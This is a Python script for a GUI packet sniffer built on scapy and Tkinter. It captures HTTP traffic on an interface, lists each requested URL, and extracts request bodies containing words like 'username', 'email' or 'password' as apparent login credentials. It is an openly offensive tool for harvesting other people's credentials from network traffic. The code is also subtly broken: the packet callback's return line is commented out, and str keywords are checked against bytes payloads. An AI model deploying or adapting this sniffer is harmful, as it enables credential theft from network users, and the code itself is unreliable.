#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
from tkinter import *
import threading


def sniff(interface, window, response):
    scapy.sniff(iface=interface, store=False, prn=read_packets(window, response))


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "usernames", "user", "email", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def read_packets(window, response):
    def process_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet).decode('utf-8')
            data = "[+] HTTP Request >> " + url
            response.insert(END, data)
            login_info = get_login_info(packet)
            if login_info:
                user_login_data = "[+] Username/Password" + login_info.decode('utf-8')
                response.insert(END, user_login_data)
        window.update()

    # return process_packet


def show_gui(interface):
    window = Tk()
    window.title("Packet Sniffer")
    window.geometry('3000x1000')

    response = Listbox(window, bg="black", font="white", height=100, width=100)
    scrollbar = Scrollbar(window)
    scrollbar.pack(side=RIGHT, fill=Y)
    quit_btn = Button(window, text="Quit", width=8, command=lambda: window.destroy())
    quit_btn.pack(side=BOTTOM)
    response.pack()
    response.config(yscrollcommand=scrollbar.set)
    scrollbar.config(command=response.yview)
    sniff(interface, window, response)
    window.update()

    window.mainloop()


def sniff_run(interface):
    current = "sniff"
    show_gui(interface)
